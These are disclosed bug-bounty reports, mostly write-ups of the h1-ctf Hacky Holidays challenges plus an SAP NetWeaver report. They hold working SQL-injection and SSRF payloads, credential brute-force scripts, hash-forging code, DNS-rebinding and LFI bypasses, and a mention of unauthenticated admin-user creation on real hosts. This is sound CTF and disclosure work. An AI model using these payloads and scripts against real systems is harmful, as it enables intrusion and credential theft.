I thought that it was weird that so many different and very specific status codes were explained here. When trying to find endpoints under `/r3c0n_server_4fdk59/api/*`, I had no success at all, the only thing I got back from the server was the message `{"error":"This endpoint cannot be visited from this IP address"}`. 

Well, that sounds like SSRF again... After trying to play with the `Host` header and `X-Forwarded-For`,... without success, I again looked at the requests I got in Burp. Finally, I found out that SQL injection was possible in the `hash` parameter when loading an album:

After finding out that it is possible to use `union` and how many fields to add for getting the same number of columns than the original query, I finally even got output: When using `5' union all select '0',0,'albumtitle' -- -` as payload in the `hash` parameter, `albumtitle` was used as title of the album, and no entries were shown. However, when using an existing album ID as first field in the `union` query, e.g. `0'+union+all+select+'1',0,'albumtitle'+--+-`, the two image links from that category showed up.

It was time to get some more information about the database structure. Because the SQL injection could be performedd by using a single request, I used sqlmap for dumping the database schema as follows:

```
$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dump
```

The following entries were found:

```
Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+

Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+
```

This only shows us data we already know and still does not help us accessing arbitrary API endpoints...

After some more thinking I had the idea to inject SQL into the SQL query and hope that the application is vulnerable to second-order sql injection. This worked indeed - I used the following proof-of concept payload for producing a single image link:

```
0' UNION ALL SELECT '0\' union all select 1,\'hash\',\'../api\' -- ',1,'albumtitle'-- -
```

JSON-decoding the image link's `data` parameter confirms that it is possible to inject into the URL:

```
{"image":"r3c0n_server_4fdk59\/uploads\/..\/api","auth":"38122d477657c1a0c9ba873c11017497"}
```

As the `auth` parameter is server-generated, it is valid, which can be confirmed by opening the image link:

```
GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkiLCJhdXRoIjoiMzgxMjJkNDc3NjU3YzFhMGM5YmE4NzNjMTEwMTc0OTcifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close


HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 02:05:21 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 29

Invalid content type detected
```

This returns an error message about the content type (probably because an image is expected), but shows that the injection can possibly be used for querying the API. Great!

I wrote a Python script for finding API endpoints and found out that there seems a valid endpoint under `/r3c0n_server_4fdk59/api/user`. However when trying to access it, I got the error message `Invalid content type detected` again!

After being stuck for a bit, I found out that the endpoint accepts the `GET` parameters `username` and `password` as well. Not sure if they were totally vulnerable to SQLI again, but it was possible to query username and password character by character by using `%` as a wildcard, because whenever the query got results, the error message `Invalid content type detected` was returned.

The following script was used to find the API endpoints and retrieve valid credentials:

```
import re
import requests
import string

from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BASE_URL = "https://hackyholidays.h1ctf.com"

# proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }
proxies = {}

def get_hash(s, payload):
    params = { "hash": f"0' UNION ALL SELECT '0\\' union all select 1,\\'hash\\',\\'{payload}\\' -- ',1,'albumtitle'-- -" }
    res = s.post(BASE_URL + "/r3c0n_server_4fdk59/album", params=params)
    m = re.search(".*<img class=\"img-responsive\" src=\"([^\"]+)\">.*", res.text, re.DOTALL)
    if m:
        return m.group(1)


def get_picture(s, url):
    res = s.get(BASE_URL + str(url))
    return res.text


def submit_try(s, payload):
    url = get_hash(s, payload)
    return get_picture(s, url)


def retrieve_username(s):
    result = ""
    alphabet = string.ascii_lowercase + string.digits
    resume = True
    while resume:
        for char in alphabet:
            if "Invalid content type detected" in submit_try(s, f"../api/user?username={result}{char}%"):
                result += char
                print(f"[+] Found: {result}")
                if "Invalid content type detected" in submit_try(s, f"../api/user?username={result}"):
                    resume = False
    return result


def retrieve_password(s, username):
    result = ""
    alphabet = string.ascii_letters + string.digits
    resume = True
    while resume:
        for char in alphabet:
            if "Invalid content type detected" in submit_try(s, f"../api/user?username={username}&password={result}{char}%"):
                result += char
                print(f"[+] Found: {result}")
                if "Invalid content type detected" in submit_try(s, f"../api/user?username={username}&password={result}"):
                    resume = False
    return result

def discover_endpoints(s, payload, normal_errormsg):
    content = []
    with open("/usr/share/seclists/Discovery/Web-Content/api/objects-lowercase.txt") as f:
        for line in f:
            fuzz = line.strip()
            url = get_hash(s, payload.format(fuzz=fuzz))
            res_text = get_picture(s, url)
            if normal_errormsg not in res_text:
                print(f"[+] {fuzz} -> {res_text}")
                content.append(fuzz)
            else:
                print(f"[-] {fuzz} -> {res_text}")
    return content


if __name__ == "__main__":
    s = requests.Session()
    s.proxies.update(proxies)
    s.verify = False

    routes = discover_endpoints(s, "../api/{fuzz}", "Expected HTTP status 200, Received: 404")
    print(f"FOUND: {routes}")

    params = discover_endpoints(s, "../api/user?{fuzz}=x", "Expected HTTP status 200, Received: 400")
    print(f"FOUND: {params}")

    username = retrieve_username(s)
    print(f"[+] Username: {username}")

    password = retrieve_password(s, username)
    print(f"[+] Password: {password}")

```

Finally, it was possible to login under [Attack Box](https://hackyholidays.h1ctf.com/attack-box/login) with the credentials `grinchadmin:s4nt4sucks` and get the flag, `flag{07a03135-9778-4dee-a83c-7ec330728e72}`:

{F1138952}


## Flag 12 - Attack Box

As shown above, a list of santa's key servers is listed on the attack-box, and attacks can be launched directly from there. When clicking on the `attack` button, a web terminal opens, showing that host information is gathered and a DDOS attack is launched. After the "attack", a ping is made to the host to see it if is still up.

Of course, we do not attack santa but the grinch himself, it is quite logical that we need to attack localhost in some way.

When clicking on `Attack` besides an IP address, a `GET` request is submitted to `https://hackyholidays.h1ctf.com/attack-box/launch` with a parameter `payload` and a value that looks like base64-encoded JSON once again.

Decoding such a payload gives the following result:

```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

Once again, the `target` parameter is protected by a hash, however, this time I could not find any possibility to make the server generate the hash for me. When trying to change the payload, the message `Invalid Protection Hash` is shown which confirms that the hash gets checked for sure, except when using any characters other than alphanumeric, dot and slash in the `target` value - in this case, the input validation fails immediately with `Invalid characters detected in the target`.

After finding the hint at https://twitter.com/Hacker0x01/status/1342545650789978112, I assumed that some salt is used to generate the hash. The length of the hash indicates that it is probably md5, hopefully the salt is either appended or prepended to the payload...

Using Hydra for cracking the salt succeeded and I found out that `mrgrinch463` is appended to the payload before calculating the MD5 hash of the payload. 

This allows generating valid hashes for arbitrary payloads and thus launch attacks against arbitrary targets - nice!

However, this turned out to the the easier step - I tried a bunch of payloads without success, e.g. possible contents of `/etc/hosts` that reference localhost and localhost IPs (`localhost`, `127.0.0.1`,`127.0.1.1`, `attackbox.local`, `attackbox`, `ip6-localhost`, `ip6-loopback`), different bypasses for making a ping to `localhost` without using `localhost` or `127.0.0.1` (`127.1`, `127.0.1`, `127.000.000.001`), IPv6 addresses (`::1`, `ipv6.localtest.me`), `hackyholidays.h1ctf.com`, the external IP / A record of `hackyholidays.h1ctf.com` (`18.216.153.32`), the AWS hostname found with [ipinfo](https://ipinfo.io/) (`ec2-18-216-153-32.us-east-2.compute.amazonaws.com"`), the internal 172 ip that was disclosed when pinging the AWS hostname from the attack box (`172.31.15.248`), broadcast addresses, my own VPS, Burp Collaborator hostnames,...

I used the following Python script for issuing manipulated requests:

```
import requests
import json
import base64
import hashlib
import re
import time
import string

from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BASE_URL = "https://hackyholidays.h1ctf.com"

# proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }
proxies = {}

def generate_hash(host):
    data = "mrgrinch463" + ("Array" if type(host) != str else host)
    return hashlib.md5(data.encode()).hexdigest()

def submit_attack(s, host):
    data = {"target": host,"hash": generate_hash(host) }
    b64payload = base64.b64encode(json.dumps(data).encode()).decode()
    params = { "payload" : b64payload }
    res = s.get(BASE_URL + "/attack-box/launch", params=params)
    m = re.search(".*getJSON\('([^']+)'.*", res.text, re.DOTALL)
    print(m)
    if m:
        return m.group(1)
    else:
        print(res.status_code, res.text)

def get_json(s, url, query_id):
    print(f"URL: {BASE_URL}{url}".replace(".json", ""))
    res = s.get(BASE_URL + url + str(query_id))
    print(res.status_code, res.text)


if __name__ == "__main__":
    s = requests.Session()
    s.proxies.update(proxies)
    requests.utils.add_dict_to_cookiejar(s.cookies, {"attackbox": "d09d508e78f3975e0199a5e91dde9687"})
    s.verify = False

    host = "<PAYLOAD>"
    print(f"[+] Attacking {host}...")
    url = submit_attack(s, host)
    if url:
        get_json(s, url, "0")
```

I could observe that invalid IPs are either not accepted at all or, if they resolve to localhost, the attack gets blocked. IPv6 addresses do not work at all. All external IPs are blocked if they reference localhost or the external IP of the server. My own VPS was not hit by ping requests, probably I would have seen incoming DNS requests on my burp collaborator client but the identifiers were 1 character too long to work, therefore I just got `Internal Server Error` when trying to cause such requests.

After nearly giving up, I found out about DNS rebinding. It sounded promising, as there was basically no other option left except of resolving to a different hostname during the initial host checks and afterwards switching to localhost.

I used `http://1u.ms/`. After adjusting the payload to the 15 seconds delay, the payload `make-1.1.1.1-rebindfor15s-127.0.0.1-rr.1u.ms` worked and I finally got the last flag, `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`:

{F1138953}

## Impact

.

---

### [Found multiple SAP NetWeaver vulnerable services](https://hackerone.com/reports/1103212)

- **Report ID:** `1103212`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Acronis
- **Reporter:** @ganofins
- **Bounty:** - usd
- **Disclosed:** 2021-02-16T13:06:43.438Z
- **CVE(s):** CVE-2020-6286, CVE-2020-6287

**Vulnerability Information:**

# Summary:
Hello Team,
I found two (**redapi.acronis.com** and **redapi2.acronis.com**) sap Netweaver vulnerable services. They do not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity, and Availability of the system, leading to Missing Authentication Check.

# Steps To Reproduce:
  1. Run the script {F1195428}
  2. You will see random user created

# POC:
Just for the POC, I have created a random user with creds
sapRpoc9049:Secure!PwD6751 (at redapi.acronis.com)
{F1195413}

# References:
https://github.com/chipik/SAP_RECON
https://nvd.nist.gov/vuln/detail/CVE-2020-6286
https://nvd.nist.gov/vuln/detail/CVE-2020-6287
https://launchpad.support.sap.com/#/notes/2934135
https://launchpad.support.sap.com/#/notes/2939665

**Please lemme know if you need any additional information reagarding this**

## Impact

# Impact:
This version of SAP netweaver does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity, and Availability of the system, leading to Missing Authentication Check.

**Summary (team):**

The report is not applicable since redapi.acronis.com and redapi2.acronis.com are internally developed systems not related to SAP NetWeaver.

---

### [It's just a man on a mission](https://hackerone.com/reports/1069388)

- **Report ID:** `1069388`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @thezoomer
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T18:02:45.904Z
- **CVE(s):** -

**Vulnerability Information:**

Preface
---------------------
Like any other good stories, this adventure has also begun with a few (long) days of preparation leading up to the start of the challenge. Tools were sharpened, command lines were dusted-off and one-too-many cups of coffee were consumed. The morale was high and the designated day finally arrived.

*Was any of that believable?  If things go south I might as well just start writing novels..dope* 🧐

What really happened was, I started this CTF three days late. I knew about it, but a little bit of procrastination (quite a lot tbh) mixed with a couple of other factors made it so I wasn't going to partake in it. Until one day (on December 15th to be precise) I opened Slack and I saw a message from @cranelab.

{F1139389}

At this point, after briefly talking to him, I was like "~~fuck it~~ screw it let's do this". 
And it began. The build-up to it was a little less epic than what I made it sound in the first place but don't worry, it's gonna be a reoccurring theme in this story. Buckle up, grab some popcorns because this is the story of 12 long days (actually it's more than 12 but it sounds cooler if I say that) filled with successes, failures, pain, happiness, tears, \*insert more emotions\* and a bad green guy.


Flag1 - Robots.txt
---------------------
I mean, the title pretty much gives it away. We're presented with a single webpage with a message explicitly stating we're not wanted here (I thought of leaving but yeah there wouldn't be a story so I didn't). 
As a good rule of thumb, when there isn't any other clear input on the page, content discovery is always a safe option. I checked the page source code, nothing was there, so I proceeded to see if the [/robots.txt](https://hackyholidays.h1ctf.com/robots.txt) endpoint was available. Yes sir, first flag down and we now have a new endpoint for what seems to be the second flag.

`flag{48104912-28b0-494a-9995-a203d1e261e7}`

Flag2 - DOM Flag
---------------------
Following the clue from flag1 let's visit `/s3cr3t-ar3a` just to be greeted by a "Page Moved" message.

{F1139514}
*Do I know where to look?*🤔

I've tried a couple of options to actually get this flag, purely based on what made sense to me. From "common" hacker endpoints (`/1337`, 1337-encoded endpoints, etc...) to random changes to the current endpoint, but none of those worked. As a reminder from flag1, always check the page source of whatever you're looking at. This time around though, don't forget that everything that javascript changes/adds/updates before the page is fully loaded will not be present in the page source(Ctrl+U). By inspecting(Ctrl+Shift+I) the fully rendered page and quickly Ctrl+f-ing for `flag` we can clearly (not from the picture below) see our 2nd flag.

{F1139537}

`flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`

Flag3 - People Rater
---------------------
Day3 - so far so good. It's a smooth ride in what is supposed to be the grinch's lair (yeah right 🤣). Something in the air makes me think it won't be this easy moving forward though. Only time will tell (I actually already know it won't be this easy cause I'm writing this after completing the CTF but yeah you get the point).
I can now see a bunch of blue buttons. By studying the behavior of the page we can see alerts popping up every time we click one of them and we also have the possibility to load more blue inputs. Let's analyze the GET request that happens every time we click one of these famous buttons.
```http
GET /people-rater/entry?id=eyJpZCI6NH0= HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
```
mmm...It looks like the `base64 encoded` id parameter is responsible for identifying a JSON object on the backend as we can observe from the response

```json
{"id":"eyJpZCI6NH0=","name":"Ruth Ward","rating":"Disgusting"}
```

The parameter itself decodes to `{"id":4}` and at this point is now pretty clear to me that we're facing an IDOR. The way we approach it can be different but I'll guide you through what I decided to do. 
The rain was pouring outside, my thoughts were pretty much syncing with the slow falling of the raindrops on the concrete balcony (idk what this means it just sounds like something you'd read in a book ). I decided to get the easy way out. Bruteforce it is. I prepared a quick script for [turbo-intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)  that copies the behavior we just analyzed, cycle through a range of numbers and look for a flag in the responses

```python
import base64
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for i in range(0, 256):
        engine.queue(target.req, base64.urlsafe_b64encode("{\"id\":" + bytes(i) + "}"))


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
``` 

One response has notably more words, flag3 has now been secured!
```json
payload: {"id":1}
response: {"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

`flag{b705fb11-fb55-442f-847f-0931be82ed9a}`

Flag4 -Swag Shop
---------------------
It's shopping time. I don't know why I should be supporting enemies' businesses but here I am. Here's the shop page.

{F1139607}

I won't lie I was feeling bougie and that 400$ snowball launcher didn't sound too bad. But unfortunately, we're not here for pleasure. After trying out the page functionalities we can see that in order to buy one of the objects we need login credentials. 
One thing that I like to do when I see a login form is quickly testing the POST `/login` request for a low-hanging SQLi vulnerability and *luckily* this was not the case. Both heuristic tests (spraying the inputs with characters such as `'` and `--` to see if something breaks or acts funny) and the sqlmap output confirmed it.
After analyzing the HTTP history for our target page we see that the backend is using an API base endpoint to execute significant operations (e.g. `/api/login` and `/api/purchase`). What could this mean? I didn't have an answer right away because I proceeded to procrastinate for a few hours like a good mature and disciplined adventurer would do. 

As soon as I got back on the page I thought of the advice I gave at the beginning of this story and proceeded to run a quick content-discovery with common API endpoints wordlist

```shell
~$ ffuf -w ~/tools/wordlists/seclists/Discovery/Web-Content/api/objects.txt -u "https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ
 :: Wordlist         : FUZZ: /home/thezoomer/tools/wordlists/seclists/Discovery/Web-Content/api/objects.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
:: Progress: [3132/3132] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
``` 

Bingo! At `/api/sessions` we now can access a JSON object full of what it looks like encoded sessions data. At first glance, one entry looks different because of the double `==` at the end of the string. The base64 decoded string looks like this:

```javascript
"{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}"
```

Interestingly enough, we now have what it looks like a user identifier plus an encoded cookie that I don't really know what to do with. I've tried setting the cookie as a session cookie in my browser(both encoded and non) but the login form was not bypassed.
In hindsight, It's actually weird that the `/api/user` endpoint wasn't found from my content discovery process. Anyway, it took me just a little bit longer to figure out the possibility to hit said endpoint to get user info. What actually took me way longer than I'd like to admit is getting the right parameter name for the request. This is probably a lesson on why wordlists are widely used or maybe on paying attention to the data you're provided with. Either way, the user value we discovered previously was a clear example of a [UUID](https://en.wikipedia.org/wiki/Universally_unique_identifier). We can now craft the following request:

```http
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
```
To my surprise, the flag is actually in the response and there's no need to bypass any login or other forms of access control.
```json
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
```

`flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`

Flag5 - Secure Login
---------------------
My wishes were fulfilled and flag5 is actually all about bypassing a login form😂. No other significant endpoints or interesting behaviors were discovered in the recon process. 

After, of course, ruling out SQLi as a possible vulnerability, I moved on to trying a good old login form spray. The hint to get this idea is right in front of us. The error message clearly says "Invalid Username". From a previous CTF(actually, it might have been one of Hacker101 challenges) I remembered that this is a clear sign of subsequent DB queries. If(and only if) the provided username exists, then a query to check for the  password validity is made. This allows an attacker to get both credentials by checking the error message for every request.

The `ffuf` command looks like this
```shell
ffuf -w ~/tools/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -u https://hackyholidays.h1ctf.com/secure-login -mr "Invalid Username"
```
and once we get the valid username `access` we can repeat the process to get the password `computer`.
The challenge is not over as we're presented with the following page.

{F1139732}

We get the hint that something needs to be downloaded. Content discovery can't help us this time. Observing the admin cookie that was set after logging in I could see a base64 string that decoded to `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`. I tried the obvious solution consisting of changing the `admin` parameter to `true`, encoding the newly obtained string, and ultimately setting the **NEW** cookie. 

This actually worked(😮) and a .zip file was now available to download: `/my_secure_files_not_for_you.zip`. One final step was required since the archive was protected with a password. Searching the web for common tools used in CTFs I came across [fcrackzip](https://github.com/hyc/fcrackzip) and it worked perfectly.

```shell
fcrackzip -v -u -D -p rockyou.txt /my_secure_files_not_for_you.zip

password: hahahaha
```
Flag5 was successfully retrieved from the `flag.txt` file inside the archive. (Nice password choice)
Side note, the archive also had a rather NSFW picture of Mr. Grinch that almost got me fired from my workplace but I'll leave that story for another day.

{F1139824}

`flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

Flag6 - My Diary
---------------------
Day 6. Morale is still relatively high. The sun is shining, I'm feeling good. 🌞
The page for flag6 `/my-diary/?template=entries.html` looks like a normal calendar with some questionable reminders.
After throwing around ideas with my fellow friend crane, it looked like content discovery was once again the first step to solve this.
This is the source code I could retrieve by spraying the `template` parameter to get an LFI-type scenario. 
Valid `/my-diary/?template=index.php` endpoint:
```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Luckily enough my source code review skills didn't let me down and after setting up a quick testing environment I tried to bypass the weak regex filtering in order to access the `admin.php` page. After many and many tries I came up with the following payload:
`/my-diary/?template=secretsecretadmin.phpadmin.phpadminadmin.php.phpadminadmin.php.php`

I was able to exploit the fact the two regex filters occurred *one after the other*.  It's quite complicated to put it into words but after writing it down it actually makes more sense. Oh well, onto the next one 🥶

`flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

Flag7 - Hate Mail Generator
---------------------
The grinch is allegedly launching a phishing campaign and I'm here supposed to be stopping it.
{F1139929}
*I don't know what's going on in this GIF just read the caption, it'll do*

The part that captured my interest was the already existing campaign. After clicking on it we can see how emails are generated

{F1139930}

This is screaming SSTI but we still don't know what we are actually supposed to include.
This time, I'll try not to dance around it. Yep, you guessed it. It's content discovery again.

`/evil-templates/templates`
{F1139927}

With this new info, we can make use of the `/hate-mail-generator/new` page and create our own malicious email.
We can't actually create a campaign "because we're out of credits" (who uses credits at all on a website in 2020 anyway) but `/hate-mail-generator/new/preview` will work just fine since it renders our manually injected payload.
Let's analyze the candidate request:

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Type: application/x-www-form-urlencoded

preview_markup=Hello+{{name}}&preview_data={"name":"Alice","email":"alice@test.com"}
```

We know the templates are added to our email by using the prefix `{{template:XXXX}}`. Directly injecting the payload in the `preview_markup`parameter doesn't work so I used the only other possible parameter (I had tested beforehand the possibility to add any custom values and properties to the `preview_data` parameter). This is what it looks like:

```http
preview_markup=Hello+{{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```
As expected the name placeholder is translated to `{{template:38dhs_admins_only_header.html}}` by the template engine and then it's recursively replaced by the actual admin-only header since access control was only enforced on the first "template substitution" cycle.

`flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`

Flag8 -Forum
---------------------
Day 8 update. I'm chilling but it's not an "I'm chilling" as powerful as a Day 1 "I'm chilling", you know what I mean? (probably not)

What a lovely forum we can see at `/forum`:

{F1139944}

There's a login functionality again and the actual posts and comments are uniquely identified by a number as we can see from `/forum/1/1`. I did try to bruteforce some hidden posts/comments with no luck.

It's discovery time all-over again! The green guy seems to love it damn.
After finding the following valid endpoint `https://hackyholidays.h1ctf.com/forum/phpmyadmin` we have to get valid credentials to access the DB manager interface.
This next step doesn't really have a logical connection to the rest and I know some people didn't love it. I wasn't really bothered by it to be completely honest. It keeps things spicy at least no? Maybe I'm just getting numb to emotions. Yeah, that's probably it. 😶
At the end of the day, it doesn't really matter.  I noticed a super old version of Jquery on the page but couldn't do anything with it. That's when someone (it may be cranelab again - don't quote me on this one) dropped a hint of having the source code stored somewhere.
[https://github.com/Grinch-Networks/](https://github.com/Grinch-Networks/)
When GitHub is involved, a wise old man once told me to always check past commits. Humans are humans(is that how the saying goes?) and they make mistakes. Well, he wasn't wrong:

{F1139956}

We can now access the database and we get the hashed password for the `grinch` user.
By inspecting the source code a little bit deeper we know it's an MD5-hashed password
```php
public static function getByLogin($username, $password){
        $d = Db::read()->prepare('select * from user where username = ? and password = ? LIMIT 1 ');
        $d->execute( array($username,md5($password)));
        return ( $d->rowCount() == 1 ) ? new User($d->fetch()) : false;
    }
```
Before proceeding to use `hashcat` to try and crack the hash I've tried to use online tools just to be sure. [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash) was actually able to crack it and we now have all we need to login into our forum.
`credentials-> grinch:BahHumbug`

A new post is now visible and the flag is right in there.

`flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`

Flag10 - Signup Manager
---------------------
You're probably wondering what happened to flag9. I don't really wanna talk about it. I now feel drained and don't even have jokes left in my inventory. Sad😢 (1 like 1 prayer thank you). Keep reading to know the truth.

This challenge was all about looking around and testing the functionalities already on the page. It's a normal login+signup form. Let's just dive into it.

{F1139967}

Once logged in as a random user we are presented with a useless page with useless info (you can probably see my pent-up anger in my typing).
A (not)old friend came to the rescue once again. Content discovery gave us a `README.md` file with some juicy pieces of information stored inside.
From this line `2) Move signupmanager.zip into the new directory and unzip it.` we now know of the existence of `/signup-manager/signupmanager.zip`. And we're back to reviewing source code. Honestly, I enjoyed it more than I expected so I'm not complaining. 

Having access to the FULL signup process and having the knowledge on how to create an admin user (`6) You can make anyone an admin by changing the last character in the users.txt file to a Y` from the `README.md` file) is now down to find a valid exploit after thoroughly understanding what's happening to the user data on the backend. This section especially allowed to me understand what my goal was:

```php
if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
[...]
```

The best way to explain it is, imagine a container where you can store objects. No matter how big they are or how many you got, at the end of the process the amount of material inside the container will always be the same (weird analogy - I don't know what container would be able to do what I just explained). I had to find something that looked small but after being processed by this magical container, it had to expand in some way. And then it hit me. Math is a complex science. There are many ways to represent numbers and one of them fits our scenario perfectly . 

By setting the age of the user to `1e5` and a last name FULL of letters `Y` I had successfully created an admin user. 
```javascript
action=signup&username=jam&password=jam&age=1e7&firstname=jamjam&lastname=jamYYYYYYYYYYYYY
```
This happens because the string `1e5` matches all the criteria in place (it is indeed numeric and shorter than 4 digits). Once the server tries to write the number on the `user.txt` file though, it translates to its actual numeric value (`100000`). When all users are retrieved on the main page, only the first 113 characters for each one are used. The last character of our newly created user-string turns out to be a `Y` and admin privileges are granted. GGs! Flag acquired and we also get a link to access the next challenge. 

`flag{99309f0f-1752-44a5-af1e-a03e4150757d}`

Flag11 - Recon Server
---------------------
Let me preface this by saying:  this is by far the hardest challenge on this CTF. It drained me of anything that I had left, from hope to sleep to enjoyment to humor (nah I'm lying I'm still gonna crack some jokes here and there). Kudos to Adam for making this but at the same time, I don't really like you after this.😉 

Let's visit the page we discovered from finishing the previous challenge.

{F1140019}

After hopping around for a bit, `sqlmap` actually found an SQLi entry point in the hash parameter at `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k`. After dumping the DB I was left with nothing but insignificant crumbles.
I knew there was an API system in place by visiting the `/api/` endpoint but it looked like it could be accessed only within the internal network.
The hint dropped by Adam was a reference to the Inception movie (I'll come clean and say I've never watched the movie even though I knew the general plot. I'm sorry movies fanatics, I'll make up to you one day). 

{F1140022}

This is where I started talking to osama.alaa (big shoutout to him) and after bouncing ideas off each other for a while we came to the conclusion of SQLi inside an SQLi, hence the movie reference What is this sorcery? Uncharted territory, to say the least. I'll fast forward the next part because it's pretty boring but it took MANY hours to finally get a working query 

```sql
hash=' UNION SELECT "' UNION SELECT 'null.jpg',null,'../api/user?username=test&password=test'-- -",null,1-- -
```

This results in a broken image, but once we open it in a new tab and hit `/r3c0n_server_4fdk59/picture?data=` the payload decodes to `{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/user?username=test&password=test","auth":"e645ca4b7a504c524e2cc1fb44fe02cc"}`

